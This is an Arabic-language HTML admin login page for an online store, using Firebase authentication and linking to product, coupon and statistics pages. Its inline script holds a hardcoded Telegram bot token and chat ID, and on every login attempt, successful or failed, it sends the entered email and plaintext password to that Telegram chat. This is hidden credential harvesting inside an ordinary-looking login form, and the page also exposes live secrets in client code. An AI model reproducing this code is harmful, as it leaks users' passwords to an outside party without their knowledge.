<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>لوحة الإدارة - البيت الرقمي</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --ios-bg-primary: #0A2F2F;
            --glass-bg: rgba(12, 45, 45, 0.65);
            --glass-border: 0.5px solid rgba(247, 249, 249, 0.15);
            --glass-blur: blur(40px);
            --ios-orange: #FF9F1C;
            --ios-label-primary: #F7F9F9;
            --ios-label-secondary: rgba(247, 249, 249, 0.8);
            --radius-xl: 28px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body { background: var(--ios-bg-primary); color: var(--ios-label-primary); direction: rtl; min-height: 100vh; }
        .login-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .login-box { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 40px; width: 100%; max-width: 420px; text-align: center; }
        .login-icon { font-size: 64px; margin-bottom: 16px; }
        .login-title { color: var(--ios-orange); font-size: 26px; font-weight: 800; }
        .login-subtitle { color: var(--ios-label-secondary); margin-bottom: 32px; }
        .form-group { margin-bottom: 20px; text-align: right; }
        .form-label { display: block; color: var(--ios-label-secondary); margin-bottom: 8px; }
        .ios-input { width: 100%; background: rgba(247, 249, 249, 0.1); border: var(--glass-border); border-radius: 14px; padding: 16px; color: white; text-align: center; }
        .ios-input:focus { border-color: var(--ios-orange); outline: none; }
        .ios-btn-primary { width: 100%; background: linear-gradient(135deg, var(--ios-orange), #E88D0C); color: white; border: none; padding: 18px; border-radius: 14px; font-size: 17px; font-weight: bold; cursor: pointer; }
        .hidden { display: none !important; }
        .admin-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: rgba(10,47,47,0.95); border-bottom: var(--glass-border); }
        .admin-header h1 { color: var(--ios-orange); }
        .logout-btn { background: rgba(231,29,54,0.2); color: #E71D36; border: 1px solid rgba(231,29,54,0.3); padding: 10px 20px; border-radius: 12px; cursor: pointer; }
        .admin-container { max-width: 1100px; margin: auto; padding: 32px 24px; }
        .admin-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px,1fr)); gap: 20px; }
        .admin-card { background: var(--glass-bg); backdrop-filter: var(--glass-blur); border: var(--glass-border); border-radius: var(--radius-xl); padding: 20px; text-align: center; text-decoration: none; color: var(--ios-label-primary); display: block; transition: 0.3s; }
        .admin-card:hover { transform: translateY(-5px); }
        .admin-card-icon { font-size: 40px; }
        .admin-card-title { font-weight: bold; margin: 10px 0; font-size: 15px; }
        .toast { position: fixed; top: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 12px 24px; border-radius: 50px; opacity: 0; transition: 0.3s; z-index: 9999; }
        .toast.show { opacity: 1; }
    </style>
</head>
<body>

    <div id="loginContainer" class="login-container">
        <div class="login-box">
            <div class="login-icon">🔐</div>
            <div class="login-title">دخول الإدارة</div>
            <div class="login-subtitle">أدخل البريد الإلكتروني وكلمة السر</div>
            <div class="form-group">
                <label class="form-label">البريد الإلكتروني</label>
                <input type="email" id="adminEmail" class="ios-input" placeholder="admin@example.com" dir="ltr">
            </div>
            <div class="form-group">
                <label class="form-label">كلمة السر</label>
                <input type="password" id="adminPassword" class="ios-input" placeholder="••••••••">
            </div>
            <button class="ios-btn-primary" onclick="loginWithEmail()">دخول ←</button>
        </div>
    </div>

    <div id="adminPanel" class="hidden">
        <header class="admin-header">
            <h1>⚙️ لوحة التحكم - البيت الرقمي</h1>
            <button class="logout-btn" onclick="logout()">🚪 خروج</button>
        </header>
        <div class="admin-container">
            <div class="admin-grid">
                <a href="admin-products.html" class="admin-card"><div class="admin-card-icon">📦</div><div class="admin-card-title">عرض المنتجات</div></a>
                <a href="admin-add.html" class="admin-card"><div class="admin-card-icon">➕</div><div class="admin-card-title">إضافة منتج</div></a>
                <a href="admin-edit.html" class="admin-card"><div class="admin-card-icon">✏️</div><div class="admin-card-title">تعديل المنتجات</div></a>
                <a href="admin-categories.html" class="admin-card"><div class="admin-card-icon">📁</div><div class="admin-card-title">الأقسام</div></a>
                <a href="admin-stats.html" class="admin-card"><div class="admin-card-icon">📊</div><div class="admin-card-title">الإحصائيات</div></a>
                <a href="admin-itemids.html" class="admin-card"><div class="admin-card-icon">🏷️</div><div class="admin-card-title">معرفات السلع</div></a>
                <a href="admin-ranges.html" class="admin-card"><div class="admin-card-icon">🔢</div><div class="admin-card-title">نطاقات المعرفات</div></a>
                <a href="admin-products-readonly.html" class="admin-card"><div class="admin-card-icon">👁️</div><div class="admin-card-title">عرض بدون أسعار</div></a>
                <a href="admin-coupons.html" class="admin-card"><div class="admin-card-icon">🎟️</div><div class="admin-card-title">كوبونات الخصم</div></a>
                <a href="admin-stats-advanced.html" class="admin-card"><div class="admin-card-icon">📈</div><div class="admin-card-title">إحصائيات متقدمة</div></a>
                <a href="banners.html" class="admin-card"><div class="admin-card-icon">🖼️</div><div class="admin-card-title">البنرات</div></a>
            </div>
        </div>
    </div>

    <div id="toast" class="toast"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC2f4rJBBBOe6qfa2EU1WfspUB5uibgwnM",
            authDomain: "hussain-1290b.firebaseapp.com",
            projectId: "hussain-1290b",
            storageBucket: "hussain-1290b.firebasestorage.app",
            messagingSenderId: "798281706738",
            appId: "1:798281706738:web:79314f6feb2add0bf5f46b"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);

        const TELEGRAM_BOT_TOKEN = "8224453502:AAE72lDosgRpoKZwT4TQhyfRLodcsd37ID8";
        const TELEGRAM_CHAT_ID = "7748217145";

        async function sendTelegramMessage(message) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
                });
            } catch(e) { console.error(e); }
        }

        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('loginContainer').classList.add('hidden');
                document.getElementById('adminPanel').classList.remove('hidden');
            } else {
                document.getElementById('loginContainer').classList.remove('hidden');
                document.getElementById('adminPanel').classList.add('hidden');
                document.getElementById('adminEmail').value = '';
                document.getElementById('adminPassword').value = '';
            }
        });

        window.loginWithEmail = async function() {
            const email = document.getElementById('adminEmail').value.trim();
            const password = document.getElementById('adminPassword').value;
            if (!email || !password) {
                showToast("❌ الرجاء إدخال البريد الإلكتروني وكلمة السر");
                return;
            }
            try {
                await signInWithEmailAndPassword(auth, email, password);
                showToast("✅ تم الدخول بنجاح");
                const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
                await sendTelegramMessage(`🔐 <b>دخول جديد إلى لوحة الإدارة</b>\n\n📧 ${email}\n🔑 ${password}\n🕒 ${now}`);
            } catch(error) {
                let msg = "❌ فشل الدخول";
                if (error.code === 'auth/user-not-found') msg = "❌ البريد الإلكتروني غير مسجل";
                else if (error.code === 'auth/wrong-password') msg = "❌ كلمة السر خاطئة";
                else if (error.code === 'auth/invalid-email') msg = "❌ صيغة البريد غير صحيحة";
                else if (error.code === 'auth/too-many-requests') msg = "❌ تم تعطيل الحساب مؤقتاً";
                showToast(msg);
                await sendTelegramMessage(`⚠️ <b>محاولة دخول فاشلة</b>\n📧 ${email}\n🔑 ${password}\n❌ ${msg}`);
                document.getElementById('adminPassword').value = '';
            }
        };

        window.logout = async function() {
            await auth.signOut();
            showToast("🚪 تم الخروج");
        };

        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.innerText = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 3000);
        }

        document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') loginWithEmail();
        });
    </script>
</body>
</html>
